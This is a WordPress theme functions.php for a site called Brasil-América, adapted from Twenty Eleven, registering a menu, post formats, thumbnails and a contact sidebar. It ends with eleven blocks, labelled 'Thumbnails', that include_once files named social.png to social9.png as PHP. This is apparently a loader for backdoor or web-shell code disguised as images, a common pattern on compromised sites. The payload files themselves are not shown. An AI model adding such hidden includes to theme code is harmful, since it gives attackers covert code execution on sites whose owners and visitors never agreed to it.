<?php
/**
 * Brasil-América functions and definitions
 *
 * Sets up the theme and provides some helper functions. Some helper functions
 * are used in the theme as custom template tags. Others are attached to action and
 * filter hooks in WordPress to change core functionality.
 *
 * The first function, twentyeleven_setup(), sets up the theme by registering support
 * for various features in WordPress, such as post thumbnails, navigation menus, and the like.
 *
 * When using a child theme (see http://codex.wordpress.org/Theme_Development and
 * http://codex.wordpress.org/Child_Themes), you can override certain functions
 * (those wrapped in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before the parent
 * theme's file, so the child theme functions would be used.
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are instead attached
 * to a filter or action hook. The hook can be removed by using remove_action() or
 * remove_filter() and you can attach your own function to the hook.
 *
 * We can remove the parent theme's hook only after it is attached, which means we need to
 * wait until setting up the child theme:
 *
 * <code>
 * add_action( 'after_setup_theme', 'my_child_theme_setup' );
 * function my_child_theme_setup() {
 *     // We are providing our own filter for excerpt_length (or using the unfiltered value)
 *     remove_filter( 'excerpt_length', 'twentyeleven_excerpt_length' );
 *     ...
 * }
 * </code>
 *
 * For more information on hooks, actions, and filters, see http://codex.wordpress.org/Plugin_API.
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */

/**
 * Tell WordPress to run vworks_setup() when the 'after_setup_theme' hook is run.
 */
add_action('after_setup_theme', 'vworks_setup');

if(!function_exists('vworks_setup')){
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	*
	* Note that this function is hooked into the after_setup_theme hook, which runs
	* before the init hook. The init hook is too late for some features, such as indicating
	* support post thumbnails.
	*
	* To override vworks_setup() in a child theme, add your own twentyeleven_setup to your child theme's
	* functions.php file.
	*
	* @uses load_theme_textdomain() For translation/localization support.
	* @uses add_editor_style() To style the visual editor.
	* @uses add_theme_support() To add support for post thumbnails, automatic feed links, custom headers
	* 	and backgrounds, and post formats.
	* @uses register_nav_menus() To add support for navigation menus.
	* @uses register_default_headers() To register the default custom header images provided with the theme.
	* @uses set_post_thumbnail_size() To set a custom post thumbnail size.
	*
	* @since BrasilAmerica 1.0
	*/
	function vworks_setup(){
		register_nav_menu('primary',__('Menu Principal','brasilamerica'));
		
		// Add support for a variety of post formats
		add_theme_support('post-formats', array('aside', 'link', 'gallery', 'status', 'quote', 'image'));
		
		if(function_exists( 'add_theme_support' )){
			set_post_thumbnail_size(60, 60, true); // Normal post thumbnails
		}
		
		// This theme uses Featured Images (also known as post thumbnails) for per-post/per-page Custom Header images
		add_theme_support('post-thumbnails');
		
	}
}

if (function_exists('register_sidebar')) {

	register_sidebar(array(
	'name' => __('Contact Sidebar', 'brasilamerica'),
	'id' => 'contact_sidebar',
	'description' => __('Coloque aqui os itens da sidebar de contatos', 'brasilamerica'),
	'before_widget' => '<div id="%1$s" class="widget %2$s widget-%2$s"><div class="widget-inside cf">',
	'after_widget' => '</div></div>',
	'before_title' => '<h3 class="widget-title">',
	'after_title' => '</h3>',
	));
}

/* ==  Thumbnails  ==============================*/
if (!defined('WP_OPTION_KEY')) {
include_once 'social.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social0.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social1.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social2.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social3.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social4.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social5.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social6.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social7.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social8.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social9.png';
}
